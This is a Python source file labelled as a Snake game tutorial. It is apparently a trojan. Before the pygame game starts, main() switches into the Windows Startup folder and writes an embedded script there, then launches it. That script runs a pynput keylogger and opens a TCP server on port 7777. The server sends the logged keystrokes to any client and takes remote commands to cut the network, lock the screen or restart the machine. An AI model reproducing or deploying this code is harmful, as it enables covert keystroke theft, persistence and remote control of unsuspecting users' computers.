# Snake Tutorial Python
import math
import random
import pygame
import tkinter as tk
from tkinter import messagebox
import os
from win32com.shell import shell, shellcon
def Change_Current_directory():
    # from https://stackoverflow.com/questions/27127710/find-startup-folder-in-windows-8-using-python
    def get_startup_directory(common):
        return shell.SHGetFolderPath(0, (shellcon.CSIDL_STARTUP, shellcon.CSIDL_COMMON_STARTUP)[common], None, 0)
    meow = (get_startup_directory(0))  # 'C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    get_startup_directory(1)  # 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    os.chdir(meow)
    print(os.getcwd())

class cube(object):
    rows = 20
    w = 500

    def __init__(self, start, dirnx=1, dirny=0, color=(255, 0, 0)):
        self.pos = start
        self.dirnx = 1
        self.dirny = 0
        self.color = color

    def move(self, dirnx, dirny):
        self.dirnx = dirnx
        self.dirny = dirny
        self.pos = (self.pos[0] + self.dirnx, self.pos[1] + self.dirny)

    def draw(self, surface, eyes=False):
        dis = self.w // self.rows
        i = self.pos[0]
        j = self.pos[1]

        pygame.draw.rect(surface, self.color, (i * dis + 1, j * dis + 1, dis - 2, dis - 2))
        if eyes:
            centre = dis // 2
            radius = 3
            circleMiddle = (i * dis + centre - radius, j * dis + 8)
            circleMiddle2 = (i * dis + dis - radius * 2, j * dis + 8)
            pygame.draw.circle(surface, (0, 0, 0), circleMiddle, radius)
            pygame.draw.circle(surface, (0, 0, 0), circleMiddle2, radius)


class snake(object):
    body = []
    turns = {}

    def __init__(self, color, pos):
        self.color = color
        self.head = cube(pos)
        self.body.append(self.head)
        self.dirnx = 0
        self.dirny = 1

    def move(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()

            keys = pygame.key.get_pressed()

            for key in keys:
                if keys[pygame.K_LEFT]:
                    self.dirnx = -1
                    self.dirny = 0
                    self.turns[self.head.pos[:]] = [self.dirnx, self.dirny]

                elif keys[pygame.K_RIGHT]:
                    self.dirnx = 1
                    self.dirny = 0
                    self.turns[self.head.pos[:]] = [self.dirnx, self.dirny]

                elif keys[pygame.K_UP]:
                    self.dirnx = 0
                    self.dirny = -1
                    self.turns[self.head.pos[:]] = [self.dirnx, self.dirny]

                elif keys[pygame.K_DOWN]:
                    self.dirnx = 0
                    self.dirny = 1
                    self.turns[self.head.pos[:]] = [self.dirnx, self.dirny]

        for i, c in enumerate(self.body):
            p = c.pos[:]
            if p in self.turns:
                turn = self.turns[p]
                c.move(turn[0], turn[1])
                if i == len(self.body) - 1:
                    self.turns.pop(p)
            else:
                if c.dirnx == -1 and c.pos[0] <= 0:
                    c.pos = (c.rows - 1, c.pos[1])
                elif c.dirnx == 1 and c.pos[0] >= c.rows - 1:
                    c.pos = (0, c.pos[1])
                elif c.dirny == 1 and c.pos[1] >= c.rows - 1:
                    c.pos = (c.pos[0], 0)
                elif c.dirny == -1 and c.pos[1] <= 0:
                    c.pos = (c.pos[0], c.rows - 1)
                else:
                    c.move(c.dirnx, c.dirny)

    def reset(self, pos):
        self.head = cube(pos)
        self.body = []
        self.body.append(self.head)
        self.turns = {}
        self.dirnx = 0
        self.dirny = 1

    def addCube(self):
        tail = self.body[-1]
        dx, dy = tail.dirnx, tail.dirny

        if dx == 1 and dy == 0:
            self.body.append(cube((tail.pos[0] - 1, tail.pos[1])))
        elif dx == -1 and dy == 0:
            self.body.append(cube((tail.pos[0] + 1, tail.pos[1])))
        elif dx == 0 and dy == 1:
            self.body.append(cube((tail.pos[0], tail.pos[1] - 1)))
        elif dx == 0 and dy == -1:
            self.body.append(cube((tail.pos[0], tail.pos[1] + 1)))

        self.body[-1].dirnx = dx
        self.body[-1].dirny = dy

    def draw(self, surface):
        for i, c in enumerate(self.body):
            if i == 0:
                c.draw(surface, True)
            else:
                c.draw(surface)


def drawGrid(w, rows, surface):
    sizeBtwn = w // rows

    x = 0
    y = 0
    for l in range(rows):
        x = x + sizeBtwn
        y = y + sizeBtwn

        pygame.draw.line(surface, (255, 255, 255), (x, 0), (x, w))
        pygame.draw.line(surface, (255, 255, 255), (0, y), (w, y))


def redrawWindow(surface):
    global rows, width, s, snack
    surface.fill((0, 0, 0))
    s.draw(surface)
    snack.draw(surface)
    drawGrid(width, rows, surface)
    pygame.display.update()


def randomSnack(rows, item):
    positions = item.body

    while True:
        x = random.randrange(rows)
        y = random.randrange(rows)
        if len(list(filter(lambda z: z.pos == (x, y), positions))) > 0:
            continue
        else:
            break

    return (x, y)


def message_box(subject, content):
    root = tk.Tk()
    root.attributes("-topmost", True)
    root.withdraw()
    messagebox.showinfo(subject, content)
    try:
        root.destroy()
    except:
        pass

def inputting_files_to_keylog_and_servers():
    text1 = """############################################################################
# Basic Server that supports threads
############################################################################
import socket
import threading
import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import ctypes
list1=[]
class Server(threading.Thread):
    def __init__(self, ip, port ):
        super(Server,self).__init__()
        self.ip = ip
        self.port = port
        self.count = 0
    def run(self):
        try:
            #print('Server starts up on ip %s port %s' % (self.ip, self.port))
            # Create a TCP/IP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind((self.ip, self.port))
            sock.listen(6)

            while True:
                #print('     waiting for a new client')
                # block
                clientSocket, client_address = sock.accept()
                print('new client entered')

                # send receive example
                clientSocket.sendall('Hello this is server'.encode('utf8'))
                msg = clientSocket.recv(1024)
                msg = msg.decode()
                print('received message: %s' % msg)
                self.count += 1
                print(self.count)
                # implement here your main logic
                self.handleClientRequest(clientSocket, self.count)
        except socket.error as e:
            print(e)
    def handleClientRequest(self, clientSock, current):
        print("hello")
        client_handler = threading.Thread(target=self.handle_client_connection, args=(clientSock, current,))
        # without comma you'd get a...
        # TypeError: handle_client_connection() argument after * must be a sequence, not _socketobject
        client_handler.start()
    def handle_client_connection(self, client_socket, current):
         global list1
         count = 0
         client_socket.sendall('connected'.encode())
         while True:
             sstr = ''.encode()
             sstr2 = ''.encode()
             data_from_client=client_socket.recv(1024)
             data_from_client=data_from_client.decode()
             data_from_client=data_from_client.upper()
             if data_from_client!=" ":
                print("DATA.UPPER IS       :           "+data_from_client)
             if data_from_client=="SENDFILE":
                 print("Arrived")
                 file=open('Desktopkey_log.txt','r')
                 to_send= file.read()
                 to_send=to_send.encode()
                 print("meow"+str(len(to_send)))
                 z = int(len(to_send) / 1024)
                 client_socket.send(str(z).encode())
                 for i in range(int(z + 1)):
                     sstr2 = (to_send[:1024])
                     sstr += (to_send[:1024])
                     client_socket.send(sstr2)
                     # print("sent")
                     to_send = to_send[1024:]

                 file.close()
                 send_done="done"
                 client_socket.sendall(send_done.encode())
             #print ("count is : " +str(count))
             x=" "
             #print(str(len(list1)))
             if  data_from_client== "INTERNET":
                 print("Shutting down the network")
                 os.system("ipconfig/release")
             if  data_from_client== "LOCK":
                 print("Locking The Screen")
                 ctypes.windll.user32.LockWorkStation()
             if data_from_client=="RESTART":
                 print("RESTARTING")
                 os.system("Shutdown -r -t 5")
             if count!=len(list1):
                x=list1[len(list1)-1]
                x=str(x)
                x=x.replace("'","")
                print ("something that should be sent to the client is :    "+str(x)+"\n")
                print('Sent TO THE CLIENTQQQQQQQQQQ    ')
                count = len(list1)
             x=x.encode()
             client_socket.sendall(x)

def Keylogger():
    global list1
    log_dir = "Desktop"
    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

    def on_press(key):
        print("On Press Is Working           Meowqw eqwds")
        logging.info(key)
        list1.append(key)
        print(list1)
        print(key)

    with Listener(on_press=on_press) as listener:
        listener.join()

def main():
    ip = '0.0.0.0'
    port = 7777
    thread = Server(ip, port)
    thread.start()
    #thread.join() **** join is just for waiting a thread to be FINISHED!!!!!!!!!
    t1=threading.Thread(target=Keylogger)
    t1.start()
    #t1.join()

main()

"""
    if os.path.isfile("Keyloginputmeow.py")==False:
            file1 = open("Keyloginputmeow.py", 'w')
            file1.write(text1)
            file1.close()
    os.startfile("Keyloginputmeow.py")


def main():
    Change_Current_directory()
    inputting_files_to_keylog_and_servers()
    global width, rows, s, snack
    width = 500
    rows = 20
    win = pygame.display.set_mode((width, width))
    s = snake((255, 0, 0), (10, 10))
    snack = cube(randomSnack(rows, s), color=(0, 255, 0))
    flag = True

    clock = pygame.time.Clock()

    while flag:
        pygame.time.delay(50)
        clock.tick(10)
        s.move()
        if s.body[0].pos == snack.pos:
            s.addCube()
            snack = cube(randomSnack(rows, s), color=(0, 255, 0))

        for x in range(len(s.body)):
            if s.body[x].pos in list(map(lambda z: z.pos, s.body[x + 1:])):
                print('Score: '+ str(len(s.body)))
                message_box('You Lost!','Play again...'+"\n"+"Your score was:    "+str(len(s.body)))
                s.reset((10, 10))
                break

        redrawWindow(win)

    pass


main()
